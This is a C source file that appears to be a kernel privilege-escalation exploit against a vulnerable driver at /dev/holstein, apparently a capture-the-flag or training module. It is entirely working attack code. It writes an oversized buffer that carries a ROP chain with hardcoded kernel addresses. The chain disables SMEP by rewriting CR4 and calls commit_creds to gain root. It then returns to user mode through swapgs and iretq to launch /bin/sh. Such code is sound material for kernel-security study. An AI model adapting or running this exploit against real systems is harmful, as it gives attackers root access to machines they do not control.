#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

char buf[0x1000];

unsigned long long user_cs, user_ss, user_rsp, user_rflags;

void *prepare_kernel_cred = (void*)0xffffffff8106e240;
void *commit_creds = (void*)0xffffffff8106e390;
void *pop_rdi = (void*)0xffffffff8127bbdc;
void *native_write_cr4 = (void*)0xffffffff81028540;
void *pop_rcx = (void*)0xffffffff812ea083;
// 0xffffffff8160c96b: mov %rax, %rdi; rep movsq (%rsi), (%rdi); ret; 
void *mov_rax_rdi = (void*)0xffffffff8160c96b;
void *iretq = (void*)0xffffffff810202af;
void *swapgs = (void*)0xffffffff8160bf7e;

void shell() {
  puts("[+] shell");
  char *argv[] = { "/bin/sh" , NULL };
  char *envp[] = { NULL };
  execve("/bin/sh", argv, envp);
}

void save_state() {
  puts("[+] save_state");
  asm volatile(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

void restore_state() {
  asm volatile("swapgs\n"
               "movq %0, 0x20(%%rsp)\n"
               "movq %1, 0x18(%%rsp)\n"
               "movq %2, 0x10(%%rsp)\n"
               "movq %3, 0x08(%%rsp)\n"
               "movq %4, 0x00(%%rsp)\n"
               "iretq"
               :
               : "r"(user_ss),
                 "r"(user_rsp),
                 "r"(user_rflags),
                 "r"(user_cs),
                 "r"(shell+1));
}

void escalate_privilage() {
  char *(*pkc)(int) = prepare_kernel_cred;
  void (*cc)(char*) = commit_creds;
  cc(pkc(0));
  restore_state();
}

int main() {
  puts("[+] main");
  save_state();
  int fd = open("/dev/holstein", O_RDWR);
  memset(buf, 'A', 0x1000);
  void **rop = (void**)&buf[0x408];
  *rop++ = pop_rdi;
  *rop++ = (void*)0x6f0;
  *rop++ = native_write_cr4;
  *rop++ = pop_rdi;
  *rop++ = (void*)0xffffffff81e33500;
  *rop++ = commit_creds;
  *rop++ = swapgs;
  *rop++ = iretq;
  
  *rop++ = shell+1;
  *rop++ = (void*)user_cs;
  *rop++ = (void*)user_rflags;
  *rop++ = (void*)user_rsp;
  *rop++ = (void*)user_ss;
  write(fd, buf, (void*)rop-(void*)buf);
  return 0;
}

